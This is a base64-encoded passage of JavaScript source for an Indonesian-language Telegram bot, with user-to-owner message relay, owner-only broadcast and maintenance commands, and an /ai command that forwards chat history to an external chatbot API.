gICAgICAgICAgIH0KICAgICAgICApCgogICAgfQopCgoKLy8gPT09PT09PT09PT09PT09PT09PT09PT09PT09PT0KLy8gQ0FOQ0VMIENIQVQKLy8gPT09PT09PT09PT09PT09PT09PT09PT09PT09PT0KYm90LmFjdGlvbigKICAgICJjYW5jZWxfY2hhdF9hZG1pbiIsCiAgICBhc3luYyAoY3R4KSA9PiB7CgogICAgICAgIGNvbnN0IHVzZXJJZCA9CiAgICAgICAgICAgIE51bWJlcihjdHguZnJvbS5pZCkKCiAgICAgICAgZGVsZXRlIEFETUlOX1JFUExZX0RCW3VzZXJJZF0KCiAgICAgICAgYXdhaXQgY3R4LmVkaXRNZXNzYWdlVGV4dCgKYAo8YmxvY2txdW90ZT48Yj7inYwgQ2hhdCBPd25lciBEaWJhdGFsa2FuPC9iPjwvYmxvY2txdW90ZT4KYCwKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgcGFyc2VfbW9kZTogIkhUTUwiCiAgICAgICAgICAgIH0KICAgICAgICApCgogICAgICAgIGF3YWl0IGN0eC5hbnN3ZXJDYlF1ZXJ5KAogICAgICAgICAgICAiQ2hhdCBkaWJhdGFsa2FuLiIKICAgICAgICApCgogICAgfQopCgoKLy8gPT09PT09PT09PT09PT09PT09PT09PT09PT09PT0KLy8gVVNFUiBNRVNTQUdFIOKGkiBPV05FUgovLyA9PT09PT09PT09PT09PT09PT09PT09PT09PT09PQpib3Qub24oCiAgICAidGV4dCIsCiAgICBhc3luYyAoY3R4LCBuZXh0KSA9PiB7CgogICAgICAgIGNvbnN0IHVzZXJJZCA9CiAgICAgICAgICAgIE51bWJlcihjdHguZnJvbS5pZCkKCiAgICAgICAgLy8gc2tpcCBvd25lcgogICAgICAgIGlmICh1c2VySWQgPT09IGNvbmZpZy5PV05FUl9JRCkgewogICAgICAgICAgICByZXR1cm4gbmV4dCgpCiAgICAgICAgfQoKICAgICAgICAvLyBidWthbiB1c2VyIGNoYXRhZG1pbgogICAgICAgIGlmICghQURNSU5fUkVQTFlfREJbdXNlcklkXSkgewogICAgICAgICAgICByZXR1cm4gbmV4dCgpCiAgICAgICAgfQoKICAgICAgICAvLyBza2lwIGNvbW1hbmQKICAgICAgICBpZiAoCiAgICAgICAgICAgIGN0eC5tZXNzYWdlLnRleHQuc3RhcnRzV2l0aCgiLyIpCiAgICAgICAgKSB7CgogICAgICAgICAgICByZXR1cm4gbmV4dCgpCiAgICAgICAgfQoKICAgICAgICAvLyB3YWt0dQogICAgICAgIGNvbnN0IHdha3R1ID0KICAgICAgICAgICAgbmV3IERhdGUoKQogICAgICAgICAgICAudG9Mb2NhbGVTdHJpbmcoCiAgICAgICAgICAgICAgICAiaWQtSUQiCiAgICAgICAgICAgICkKCiAgICAgICAgLy8ga2lyaW0ga2Ugb3duZXIKICAgICAgICBjb25zdCBzZW50ID0KICAgICAgICAgICAgYXdhaXQgYm90LnRlbGVncmFtLnNlbmRNZXNzYWdlKAogICAgICAgICAgICAgICAgY29uZmlnLk9XTkVSX0lELApgCjxibG9ja3F1b3RlPjxiPvCfk6kgUEVTQU4gVVNFUjwvYj48L2Jsb2NrcXVvdGU+CjxibG9ja3F1b3RlPgrwn5GkIFVzZXJuYW1lIDogQCR7Y3R4LmZyb20udXNlcm5hbWUgfHwgIlRpZGFrIGFkYSJ9CvCfhpQgSUQgOiA8Y29kZT4ke3VzZXJJZH08L2NvZGU+CvCflZIgV2FrdHUgOiR7d2FrdHV9CvCfk50gUGVzYW4gOiA8cHJlPiR7Y3R4Lm1lc3NhZ2UudGV4dH08L3ByZT4KPGJsb2NrcXVvdGU8Yj5SZXBseSBDaGF0IFVudHVrIE1lbWJhbGFzIFBlc2FuIFVzZXI8L2I+PC9ibG9ja3F1b3RlPgpgLAogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIHBhcnNlX21vZGU6ICJIVE1MIgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICApLmNhdGNoKCgpID0+IG51bGwpCgogICAgICAgIC8vIHNpbXBhbiBtZXNzYWdlIG1hcHBpbmcKICAgICAgICBpZiAoc2VudCkgewoKICAgICAgICAgICAgQURNSU5fUkVQTFlfREJbCiAgICAgICAgICAgICAgICBzZW50Lm1lc3NhZ2VfaWQKICAgICAgICAgICAgXSA9IHVzZXJJZAogICAgICAgIH0KCiAgICAgICAgLy8gbm90aWYgdXNlcgogICAgICAgIGF3YWl0IGN0eC5yZXBseSgKYAo8YmxvY2txdW90ZT48Yj7inIUgUGVzYW4gQmVyaGFzaWwgRGlraXJpbTwvYj48L2Jsb2NrcXVvdGU+CjxibG9ja3F1b3RlPjxiPlR1bmdndSBoaW5nZ2Egb3duZXIgbWVtYmFsYXMgcGVzYW4gYW5kYS48L2I+PC9ibG9ja3F1b3RlPgpgLAogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBwYXJzZV9tb2RlOiAiSFRNTCIKICAgICAgICAgICAgfQogICAgICAgICkKCiAgICB9CikKCgovLyA9PT09PT09PT09PT09PT09PT09PT09PT09PT09PQovLyBPV05FUiBSRVBMWSDihpIgVVNFUgovLyA9PT09PT09PT09PT09PT09PT09PT09PT09PT09PQpib3Qub24oCiAgICAidGV4dCIsCiAgICBhc3luYyAoY3R4LCBuZXh0KSA9PiB7CgogICAgICAgIGNvbnN0IG93bmVySWQgPQogICAgICAgICAgICBOdW1iZXIoY3R4LmZyb20uaWQpCgogICAgICAgIC8vIGhhbnlhIG93bmVyCiAgICAgICAgaWYgKG93bmVySWQgIT09IGNvbmZpZy5PV05FUl9JRCkgewogICAgICAgICAgICByZXR1cm4gbmV4dCgpCiAgICAgICAgfQoKICAgICAgICBjb25zdCByZXBseSA9CiAgICAgICAgICAgIGN0eC5tZXNzYWdlLnJlcGx5X3RvX21lc3NhZ2UKCiAgICAgICAgLy8gaGFydXMgcmVwbHkKICAgICAgICBpZiAoIXJlcGx5KSB7CiAgICAgICAgICAgIHJldHVybiBuZXh0KCkKICAgICAgICB9CgogICAgICAgIC8vIHNraXAgY29tbWFuZAogICAgICAgIGlmICgKICAgICAgICAgICAgY3R4Lm1lc3NhZ2UudGV4dC5zdGFydHNXaXRoKCIvIikKICAgICAgICApIHsKCiAgICAgICAgICAgIHJldHVybiBuZXh0KCkKICAgICAgICB9CgogICAgICAgIC8vIGFtYmlsIHRhcmdldCB1c2VyCiAgICAgICAgY29uc3QgdGFyZ2V0VXNlciA9CiAgICAgICAgICAgIEFETUlOX1JFUExZX0RCWwogICAgICAgICAgICAgICAgcmVwbHkubWVzc2FnZV9pZAogICAgICAgICAgICBdCgogICAgICAgIC8vIHRpZGFrIGFkYSB0YXJnZXQKICAgICAgICBpZiAoIXRhcmdldFVzZXIpIHsKICAgICAgICAgICAgcmV0dXJuIG5leHQoKQogICAgICAgIH0KCiAgICAgICAgLy8ga2lyaW0gYmFsYXNhbgogICAgICAgIGF3YWl0IGJvdC50ZWxlZ3JhbS5zZW5kTWVzc2FnZSgKICAgICAgICAgICAgdGFyZ2V0VXNlciwKYAo8YmxvY2txdW90ZT48Yj7wn5KsIEJBTEFTQU48L2I+PC9ibG9ja3F1b3RlPgo8cHJlPiR7Y3R4Lm1lc3NhZ2UudGV4dH08L3ByZT4KYCwKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgcGFyc2VfbW9kZTogIkhUTUwiCiAgICAgICAgICAgIH0KICAgICAgICApLmNhdGNoKCgpID0+IHt9KQoKICAgICAgICAvLyBub3RpZiBvd25lcgogICAgICAgIGF3YWl0IGN0eC5yZXBseSgKICAgICAgICAgICAgIuKchSBCYWxhc2FuIGJlcmhhc2lsIGRpa2lyaW0uIgogICAgICAgICkuY2F0Y2goKCkgPT4ge30pCgogICAgfQopCgpib3QuY29tbWFuZCgiYnJvYWRjYXN0IiwgYXN5bmMgKGN0eCkgPT4gewoKICAgIGlmIChjdHguZnJvbS5pZCAhPT0gY29uZmlnLk9XTkVSX0lEKSB7CiAgICAgICAgcmV0dXJuIGN0eC5yZXBseSgi4p2MIEtodXN1cyBPd25lciIpCiAgICB9CgogICAgaWYgKCFjdHgubWVzc2FnZS5yZXBseV90b19tZXNzYWdlKSB7CiAgICAgICAgcmV0dXJuIGN0eC5yZXBseSgKICAgICAgICAgICAgIlJlcGx5IHBlc2FuIHlhbmcgaW5naW4gZGlicm9hZGNhc3QgbGFsdSBrZXRpayAvYnJvYWRjYXN0IgogICAgICAgICkKICAgIH0KCiAgICBpZiAoIWZzLmV4aXN0c1N5bmMoQUNDRVNTX0ZJTEUpKSB7CiAgICAgICAgcmV0dXJuIGN0eC5yZXBseSgKICAgICAgICAgICAgIuKdjCBEYXRhYmFzZSB1c2VyIHRpZGFrIGRpdGVtdWthbi4iCiAgICAgICAgKQogICAgfQoKICAgIGNvbnN0IGRiID0gSlNPTi5wYXJzZSgKICAgICAgICBmcy5yZWFkRmlsZVN5bmMoQUNDRVNTX0ZJTEUsICJ1dGY4IikKICAgICkKCiAgICBjb25zdCB1c2VycyA9IE9iamVjdC5rZXlzKAogICAgICAgIGRiLnVzZXJzIHx8IHt9CiAgICApCiAgICAubWFwKGlkID0+IE51bWJlcihpZCkpCiAgICAuZmlsdGVyKGlkID0+IGlkICE9PSBjb25maWcuT1dORVJfSUQpCgogICAgaWYgKCF1c2Vycy5sZW5ndGgpIHsKICAgICAgICByZXR1cm4gY3R4LnJlcGx5KAogICAgICAgICAgICAi4p2MIFRpZGFrIGFkYSB1c2VyIHRlcmRhZnRhci4iCiAgICAgICAgKQogICAgfQoKICAgIGNvbnN0IHJlcGx5TXNnID0KICAgICAgICBjdHgubWVzc2FnZS5yZXBseV90b19tZXNzYWdlCgogICAgY29uc3Qgd2FpdE1zZyA9IGF3YWl0IGN0eC5yZXBseSgKYDxwcmU+4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paSIDAlPC9wcmU+Ck1lbXVsYWkgQnJvYWRjYXN0Li4uYCwKICAgICAgICB7CiAgICAgICAgICAgIHBhcnNlX21vZGU6ICJIVE1MIgogICAgICAgIH0KICAgICkKCiAgICBjb25zdCBzdGVwcyA9IFsKICAgICAgICB7CiAgICAgICAgICAgIHBlcmNlbnQ6IDEwLAogICAgICAgICAgICB0ZXh0OiAi4pqZ77iPIE1lbmdhbWJpbCBEYXRhYmFzZSBVc2VyIiwKICAgICAgICAgICAgZGVsYXk6IDUwMAogICAgICAgIH0sCiAgICAgICAgewogICAgICAgICAgICBwZXJjZW50OiA0MCwKICAgICAgICAgICAgdGV4dDogIuKame+4jyBNZW55aWFwa2FuIEJyb2FkY2FzdCIsCiAgICAgICAgICAgIGRlbGF5OiA3MDAKICAgICAgICB9LAogICAgICAgIHsKICAgICAgICAgICAgcGVyY2VudDogNTAsCiAgICAgICAgICAgIHRleHQ6ICLimpnvuI8gTWVtdmFsaWRhc2kgVXNlciBBa3RpZiIsCiAgICAgICAgICAgIGRlbGF5OiA2MDAKICAgICAgICB9LAogICAgICAgIHsKICAgICAgICAgICAgcGVyY2VudDogNzAsCiAgICAgICAgICAgIHRleHQ6ICLimpnvuI8gTWVuZ2lyaW0gQnJvYWRjYXN0IiwKICAgICAgICAgICAgZGVsYXk6IDgwMAogICAgICAgIH0sCiAgICAgICAgewogICAgICAgICAgICBwZXJjZW50OiA5MCwKICAgICAgICAgICAgdGV4dDogIuKame+4jyBNZW55ZWxlc2Fpa2FuIEJyb2FkY2FzdCIsCiAgICAgICAgICAgIGRlbGF5OiA2MDAKICAgICAgICB9LAogICAgICAgIHsKICAgICAgICAgICAgcGVyY2VudDogMTAwLAogICAgICAgICAgICB0ZXh0OiAi4pyFIEJyb2FkY2FzdCBTaWFwIERpa2lyaW0iLAogICAgICAgICAgICBkZWxheTogNTAwCiAgICAgICAgfQogICAgXQoKICAgIGZvciAoY29uc3Qgc3RlcCBvZiBzdGVwcykgewoKICAgICAgICBjb25zdCBiYXJMZW5ndGggPSAyMAoKICAgICAgICBjb25zdCBmaWxsZWQgPSBNYXRoLnJvdW5kKAogICAgICAgICAgICAoc3RlcC5wZXJjZW50IC8gMTAwKSAqCiAgICAgICAgICAgIGJhckxlbmd0aAogICAgICAgICkKCiAgICAgICAgY29uc3QgYmFyID0KICAgICAgICAgICAgIuKWiCIucmVwZWF0KGZpbGxlZCkgKwogICAgICAgICAgICAi4paSIi5yZXBlYXQoCiAgICAgICAgICAgICAgICBiYXJMZW5ndGggLSBmaWxsZWQKICAgICAgICAgICAgKQoKICAgICAgICBhd2FpdCBjdHgudGVsZWdyYW0uZWRpdE1lc3NhZ2VUZXh0KAogICAgICAgICAgICB3YWl0TXNnLmNoYXQuaWQsCiAgICAgICAgICAgIHdhaXRNc2cubWVzc2FnZV9pZCwKICAgICAgICAgICAgdW5kZWZpbmVkLApgPHByZT4ke2Jhcn0gJHtzdGVwLnBlcmNlbnR9JQoke3N0ZXAudGV4dH08L3ByZT4K8J2RmfCdkZzwnZGO8J2RkfCdkZbwnZGb8J2RlC4uLgpgLAogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBwYXJzZV9tb2RlOiAiSFRNTCIKICAgICAgICAgICAgfQogICAgICAgICkuY2F0Y2goKCkgPT4ge30pCgogICAgICAgIGF3YWl0IHBhdXNlKHN0ZXAuZGVsYXkpCgogICAgfQoKICAgIGxldCBzdWNjZXNzID0gMAogICAgbGV0IGZhaWxlZCA9IDAKCiAgICBmb3IgKGNvbnN0IHVzZXJJZCBvZiB1c2VycykgewoKICAgICAgICB0cnkgewoKICAgICAgICAgICAgaWYgKHJlcGx5TXNnLnRleHQpIHsKCiAgICAgICAgICAgICAgICBhd2FpdCBjdHgudGVsZWdyYW0uc2VuZE1lc3NhZ2UoCiAgICAgICAgICAgICAgICAgICAgdXNlcklkLAogICAgICAgICAgICAgICAgICAgIGAKPGJsb2NrcXVvdGU+PGI+8J+ToiBCcm9hZGNhc3QgRnJvbSBPd25lcjwvYj48L2Jsb2NrcXVvdGU+CjxibG9ja3F1b3RlPiR7cmVwbHlNc2cudGV4dH08L2Jsb2NrcXVvdGU+CjxibG9ja3F1b3RlPjxiPkppa2EgQWRhIHlhbmcgaW5naW4gZGkgdGFueWFrYW4ga2Ugb3duZXIgZ3VuYWthbiBjb21tYW5kIC9jaGF0b3duZXI8L2I+PC9ibG9ja3F1b3RlPmAsCiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICBwYXJzZV9tb2RlOiAiSFRNTCIKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICApCgogICAgICAgICAgICB9IGVsc2UgewoKICAgICAgICAgICAgICAgIGF3YWl0IGN0eC50ZWxlZ3JhbS5jb3B5TWVzc2FnZSgKICAgICAgICAgICAgICAgICAgICB1c2VySWQsCiAgICAgICAgICAgICAgICAgICAgY3R4LmNoYXQuaWQsCiAgICAgICAgICAgICAgICAgICAgcmVwbHlNc2cubWVzc2FnZV9pZAogICAgICAgICAgICAgICAgKQoKICAgICAgICAgICAgfQoKICAgICAgICAgICAgc3VjY2VzcysrCgogICAgICAgIH0gY2F0Y2ggewoKICAgICAgICAgICAgZmFpbGVkKysKCiAgICAgICAgfQoKICAgICAgICBhd2FpdCBwYXVzZSgxMDApCgogICAgfQoKICAgIGF3YWl0IGN0eC50ZWxlZ3JhbS5kZWxldGVNZXNzYWdlKAogICAgICAgIGN0eC5jaGF0LmlkLAogICAgICAgIHdhaXRNc2cubWVzc2FnZV9pZAogICAgKS5jYXRjaCgoKSA9PiB7fSkKCiAgICBhd2FpdCBjdHgucmVwbHkoCmA8YmxvY2txdW90ZT7wn5OiIDxiPkJST0FEQ0FTVCBTRUxFU0FJPC9iPjwvYmxvY2txdW90ZT4KPGJsb2NrcXVvdGU+CuKchSBCZXJoYXNpbCA6ICR7c3VjY2Vzc30K4p2MIEdhZ2FsIDogJHtmYWlsZWR9CvCfkaUgVG90YWwgOiAke3VzZXJzLmxlbmd0aH08L2Jsb2NrcXVvdGU+CjxibG9ja3F1b3RlPkJyb2FkY2FzdCBiZXJoYXNpbCBkaWtpcmltIGtlIHNlbHVydWggdXNlciBha3RpZi48L2Jsb2NrcXVvdGU+YCwKICAgICAgICB7CiAgICAgICAgICAgIHBhcnNlX21vZGU6ICJIVE1MIgogICAgICAgIH0KICAgICkKCn0pCgovLyA9PT09PT09PT09PT09PT09PT09PT09PT09PT09PQovLyBNQUlOVEVOQU5DRSBDT01NQU5ECi8vID09PT09PT09PT09PT09PT09PT09PT09PT09PT09CmJvdC5jb21tYW5kKCJtYWludGVuYW5jZSIsIGFzeW5jIChjdHgpID0+IHsKCiAgICBjb25zdCB1c2VySWQgPSBOdW1iZXIoY3R4LmZyb20uaWQpCgogICAgLy8gb3duZXIgb25seQogICAgaWYgKHVzZXJJZCAhPT0gY29uZmlnLk9XTkVSX0lEKSB7CiAgICAgICAgcmV0dXJuIGN0eC5yZXBseSgi4p2MIEtodXN1cyBvd25lci4iKQogICAgfQoKICAgIGNvbnN0IHRleHQgPSBjdHgubWVzc2FnZS50ZXh0CgogICAgLy8gYW1iaWwgYXJncwogICAgY29uc3QgYXJncyA9IHRleHQuc3BsaXQoIiAiKS5zbGljZSgxKS5qb2luKCIgIikKCiAgICAvLyBrYWxhdSBrb3NvbmcKICAgIGlmICghYXJncykgewogICAgICAgIHJldHVybiBjdHgucmVwbHkoYFxgXGBcYGpzCvCfk4wgTWFpbnRlbmFuY2UgTW9kZQoKL21haW50ZW5hbmNlIG9ufHVwZGF0ZSBzeXN0ZW0KL21haW50ZW5hbmNlIG9mZnxtYWludGVuYW5jZSBzZWxlc2FpXGBcYFxgCiAgICAgICAgICAgIGAsCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIHBhcnNlX21vZGU6ICJNYXJrZG93biIKICAgICAgICAgICAgfQogICAgICAgICkKICAgIH0KCiAgICAvLyBzcGxpdCBvbi9vZmYgZGFuIGFsYXNhbgogICAgY29uc3QgW21vZGUsIC4uLnJlYXNvbkFycmF5XSA9IGFyZ3Muc3BsaXQoInwiKQoKICAgIGNvbnN0IGlucHV0ID0gbW9kZS50cmltKCkudG9Mb3dlckNhc2UoKQoKICAgIGNvbnN0IHJlYXNvbiA9IHJlYXNvbkFycmF5LmpvaW4oInwiKS50cmltKCkgfHwgIlRpZGFrIGFkYSBhbGFzYW4iCgogICAgLy8gPT09PT09PT09PT09PT09PT09PT09PT09PT09PT0KICAgIC8vIE9OCiAgICAvLyA9PT09PT09PT09PT09PT09PT09PT09PT09PT09PQogICAgaWYgKGlucHV0ID09PSAib24iKSB7CgogICAgICAgIGZzLndyaXRlRmlsZVN5bmMoCiAgICAgICAgICAgIFBBVEhfTUFJTlRFTkFOQ0UsCiAgICAgICAgICAgIEpTT04uc3RyaW5naWZ5KHsKICAgICAgICAgICAgICAgIHN0YXR1czogdHJ1ZSwKICAgICAgICAgICAgICAgIHJlYXNvbgogICAgICAgICAgICB9LCBudWxsLCAyKQogICAgICAgICkKCiAgICAgICAgcmV0dXJuIGN0eC5yZXBseSgKICAgICAgICAgICAgYFxgXGBcYGpzCvCfm6AgTWFpbnRlbmFuY2UgRW5hYmxlZAoK8J+TjCBTdGF0dXMgOiBPTgrwn5OdIEFsYXNhbiA6ICR7cmVhc29ufVxgXGBcYAogICAgICAgICAgICBgLAogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBwYXJzZV9tb2RlOiAiTWFya2Rvd24iCiAgICAgICAgICAgIH0KICAgICAgICApCiAgICB9CgogICAgLy8gPT09PT09PT09PT09PT09PT09PT09PT09PT09PT0KICAgIC8vIE9GRgogICAgLy8gPT09PT09PT09PT09PT09PT09PT09PT09PT09PT0KICAgIGlmIChpbnB1dCA9PT0gIm9mZiIpIHsKCiAgICAgICAgZnMud3JpdGVGaWxlU3luYygKICAgICAgICAgICAgUEFUSF9NQUlOVEVOQU5DRSwKICAgICAgICAgICAgSlNPTi5zdHJpbmdpZnkoewogICAgICAgICAgICAgICAgc3RhdHVzOiBmYWxzZSwKICAgICAgICAgICAgICAgIHJlYXNvbgogICAgICAgICAgICB9LCBudWxsLCAyKQogICAgICAgICkKCiAgICAgICAgcmV0dXJuIGN0eC5yZXBseSgKICAgICAgICAgICAgYFxgXGBcYArinIUgTWFpbnRlbmFuY2UgRGlzYWJsZWQKCvCfk4wgU3RhdHVzIDogT0ZGCvCfk50gS2V0ZXJhbmdhbiA6ICR7cmVhc29ufVxgXGBcYAogICAgICAgICAgICBgLAogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBwYXJzZV9tb2RlOiAiTWFya2Rvd24iCiAgICAgICAgICAgIH0KICAgICAgICApCiAgICB9CgogICAgLy8gaW52YWxpZAogICAgcmV0dXJuIGN0eC5yZXBseSgKICAgICAgICBgXGBcYFxgCuKcmCBGb3JtYXQgU2FsYWgKCi9tYWludGVuYW5jZSBvbnxhbGFzYW4KL21haW50ZW5hbmNlIG9mZnxhbGFzYW5cYFxgXGAKICAgICAgICBgLAogICAgICAgIHsKICAgICAgICAgICAgcGFyc2VfbW9kZTogIk1hcmtkb3duIgogICAgICAgIH0KICAgICkKfSkKLy8gPT09PT09PT09PT09PT09PT09PT0gQ09NTUFORCAvQ0xBVURFID09PT09PT09PT09PT09PT09PT09CmJvdC5jb21tYW5kKCdhaScsIGFzeW5jIChjdHgpID0+IHsKCiAgICBjb25zdCBjaGF0SWQgPSBjdHguY2hhdC5pZDsKICAgIGNvbnN0IG93bmVySWQgPSBjb25maWcuT1dORVJfSUQ7CiAgICBjb25zdCBzZXNzaW9uRnAgPSBwYXRoLmpvaW4oX19kaXJuYW1lLCAnLi9kYXRhYmFzZS9haS5qc29uJyk7CgogICAgLy8gQ2VrIG1haW50ZW5hbmNlIChqaWthIGZ1bmdzaSBpc01haW50ZW5hbmNlIGFkYSkKICAgIGlmICh0eXBlb2YgaXNNYWludGVuYW5jZSA9PT0gJ2Z1bmN0aW9uJyAmJiBpc01haW50ZW5hbmNlKCkgJiYgY2hhdElkICE9PSBvd25lcklkKSB7CiAgICAgICAgcmV0dXJuIGN0eC5yZXBseSgn8J+boCBCb3Qgc2VkYW5nIG1haW50ZW5hbmNlLicpOwogICAgfQoKICAgIC8vIEFtYmlsIHRla3Mgc2V0ZWxhaCAvY2xhdWRlCiAgICBjb25zdCBxID0gY3R4Lm1lc3NhZ2UudGV4dC5yZXBsYWNlKC9eXC9haVxzKi8sICcnKS50cmltKCk7CiAgICBpZiAoIXEpIHsKICAgICAgICByZXR1cm4gY3R4LnJlcGx5KCfwn5KsIE1hc3Vra2FuIHBlcnRhbnlhYW4gc2V0ZWxhaCAvYWknKTsKICAgIH0KCiAgICAvLyBLaXJpbSBwZXNhbiAic2VkYW5nIG1lbXByb3Nlcy4uLiIKICAgIGNvbnN0IHdhaXRNc2cgPSBhd2FpdCBjdHgucmVwbHkoJ1dhaXRpbmcuLi4nKTsKCiAgICAvLyBGdW5nc2kgbG9hZC9zYXZlIHNlc3Npb24KICAgIGNvbnN0IGxvYWRBSSA9ICgpID0+IHsKICAgICAgICB0cnkgewogICAgICAgICAgICBpZiAoIWZzLmV4aXN0c1N5bmMoc2Vzc2lvbkZwKSkgewogICAgICAgICAgICAgICAgZnMud3JpdGVKc29uU3luYyhzZXNzaW9uRnAsIHt9KTsKICAgICAgICAgICAgICAgIHJldHVybiB7fTsKICAgICAgICAgICAgfQogICAgICAgICAgICByZXR1cm4gZnMucmVhZEpzb25TeW5jKHNlc3Npb25GcCk7CiAgICAgICAgfSBjYXRjaCAoZSkgewogICAgICAgICAgICBjb25zb2xlLmVycm9yKCdbQUktU0VTUy1FUlJdJywgZS5tZXNzYWdlKTsKICAgICAgICAgICAgcmV0dXJuIHt9OwogICAgICAgIH0KICAgIH07CiAgICBjb25zdCBzYXZlQUkgPSAoZGF0YSkgPT4gewogICAgICAgIHRyeSB7CiAgICAgICAgICAgIGZzLndyaXRlSnNvblN5bmMoc2Vzc2lvbkZwLCBkYXRhLCB7IHNwYWNlczogMiB9KTsKICAgICAgICB9IGNhdGNoIChlKSB7CiAgICAgICAgICAgIGNvbnNvbGUuZXJyb3IoJ1tBSS1TQVZFLUVSUl0nLCBlLm1lc3NhZ2UpOwogICAgICAgIH0KICAgIH07CiAgICBjb25zdCBnZXRTZXNzaW9uID0gKHVpZCwgZGIpID0+IHsKICAgICAgICBpZiAoIWRiW3VpZF0pIGRiW3VpZF0gPSBbXTsKICAgICAgICByZXR1cm4gZGJbdWlkXTsKICAgIH07CgogICAgdHJ5IHsKICAgICAgICBjb25zdCB1aWQgPSBjdHguZnJvbS5pZC50b1N0cmluZygpOwogICAgICAgIGNvbnN0IGFpRGIgPSBsb2FkQUkoKTsKICAgICAgICBjb25zdCBzZXNzID0gZ2V0U2Vzc2lvbih1aWQsIGFpRGIpOwoKICAgICAgICBzZXNzLnB1c2goeyByb2xlOiAndXNlcicsIGNvbnRlbnQ6IHEgfSk7CiAgICAgICAgaWYgKHNlc3MubGVuZ3RoID4gMjApIGFpRGJbdWlkXSA9IHNlc3Muc2xpY2UoLTEwKTsKCiAgICAgICAgY29uc3Qgc3lzdGVtUHJvbXB0ID0gYApBdHVyYW4gZm9ybWF0IGphd2FiYW46Ci0gR3VuYWthbiBNYXJrZG93biBUZWxlZ3JhbSBzZWRlcmhhbmEgKGJvbGQsIGJ1bGxldCkuCi0gRGlsYXJhbmcgbWVuZ2d1bmFrYW4gdGFiZWwuCi0gSmlrYSBwZW5qZWxhc2FuIGJpYXNhLCBwYWthaSB0ZWtzIGRhbiBidWxsZXQgc2FqYS4KLSBKaWthIGFkYSBrb2RlLCBndW5ha2FuIGJsb2sga29kZSAoXGBcYFxgKSBzZXN1YWkgYmFoYXNhLgotIEphbmdhbiBndW5ha2FuIGVtb2ppIGJlcmxlYmloYW4uCi0gTGFuZ3N1bmcgdG8gdGhlIHBvaW50LCBqYW5nYW4gdWxhbmcgcGVydGFueWFhbiB1c2VyLgotIFBhc3Rpa2FuIG91dHB1dCBhbWFuIHVudHVrIFRlbGVncmFtIHRhbnBhIGVycm9yIHBhcnNlLgpTZXNzaW9uIE1lbW9yeToKLSBMaWhhdCBoaXN0b3J5IGNoYXQgdGVyYWtoaXIgKG1heCAxMCBwZXNhbikuCi0gTGFuanV0a2FuIGtvbnRla3MgcGVyY2FrYXBhbiBzZWJlbHVtbnlhLgotIEluZ2F0IGRldGFpbCB5YW5nIHN1ZGFoIGRpc2VidXRrYW4gdXNlci5gLnRyaW0oKTsKCiAgICAgICAgY29uc3QgY2hhdEhpc3RvcnkgPSBbCiAgICAgICAgICAgIHsgcm9sZTogJ3N5c3RlbScsIGNvbnRlbnQ6IHN5c3RlbVByb21wdCB9LAogICAgICAgICAgICAuLi5zZXNzLnNsaWNlKC0xMCksCiAgICAgICAgXTsKCiAgICAgICAgY29uc3QgeyBkYXRhIH0gPSBhd2FpdCBheGlvcy5wb3N0KAogICAgICAgICAgICAnaHR0cHM6Ly9hbGlpY2lhLm15LmlkL2FwaS9jaGF0Z3B0JywKICAgICAgICAgICAgeyBtZXNzYWdlOiBjaGF0SGlzdG9yeSB9LAogICAgICAgICAgICB7IGhlYWRlcnM6IHsgJ0NvbnRlbnQtVHlwZSc6ICdhcHBsaWNhdGlvbi9qc29uJyB9IH0KICAgICAgICApOwoKICAgICAgICBsZXQgYW5zID0gKGRhdGE/LnJlc3BvbnNlIHx8ICdHYWdhbCBtZW5kYXBhdGthbiBqYXdhYmFuLicpCiAgICAgICAgICAgIC5yZXBsYWNlKC9cdTAwMDAvZywgJycpLnJlcGxhY2UoL1xyXG4vZywgJ1xuJykucmVwbGFjZSgvXHIvZywgJ1xuJykudHJpbSgpOwoKICAgICAgICBzZXNzLnB1c2goeyByb2xlOiAnYXNzaXN0YW50JywgY29udGVudDogYW5zIH0pOwogICAgICAgIHNhdmVBSShhaURiKTsKCiAgICAgICAgLy8gRnVuZ3NpIHNwbGl0IHVudHVrIG1lbW90b25nIHBlc2FuID4gNDAwMCBrYXJha3RlciAoYmF0YXMgYW1hbiBUZWxlZ3JhbSA0MDk2KQogICAgICAgIGNvbnN0IHNwbGl0UmVzcG9uc2UgPSAodGV4dCwgbWF4TGVuID0gNDAwMCkgPT4gewogICAgICAgICAgICBjb25zdCBwYXJ0cyA9IFtdOwogICAgICAgICAgICBjb25zdCBjb2RlUnggPSAvYGBgW1xzXFNdKj9gYGAvZzsKICAgICAgICAgICAgY29uc3Qgc2VncyA9IFtdOwogICAgICAgICAgICBsZXQgbGFzdElkeCA9IDAsIG07CgogICAgICAgICAgICB3aGlsZSAoKG0gPSBjb2RlUnguZXhlYyh0ZXh0KSkgIT09IG51bGwpIHsKICAgICAgICAgICAgICAgIGlmIChtLmluZGV4ID4gbGFzdElkeCkgc2Vncy5wdXNoKHsgdDogJ3RleHQnLCB2OiB0ZXh0LnN1YnN0cmluZyhsYXN0SWR4LCBtLmluZGV4KSB9KTsKICAgICAgICAgICAgICAgIHNlZ3MucHVzaCh7IHQ6ICdjb2RlJywgdjogbVswXSB9KTsKICAgICAgICAgICAgICAgIGxhc3RJZHggPSBtLmluZGV4ICsgbVswXS5sZW5ndGg7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYgKGxhc3RJZHggPCB0ZXh0Lmxlbmd0aCkgc2Vncy5wdXNoKHsgdDogJ3RleHQnLCB2OiB0ZXh0LnN1YnN0cmluZyhsYXN0SWR4KSB9KTsKCiAgICAgICAgICAgIGxldCBjdXIgPSAnJzsKICAgICAgICAgICAgZm9yIChjb25zdCBzZWcgb2Ygc2VncykgewogICAgICAgICAgICAgICAgaWYgKChjdXIubGVuZ3RoICsgc2VnLnYubGVuZ3RoKSA8PSBtYXhMZW4pIHsKICAgIC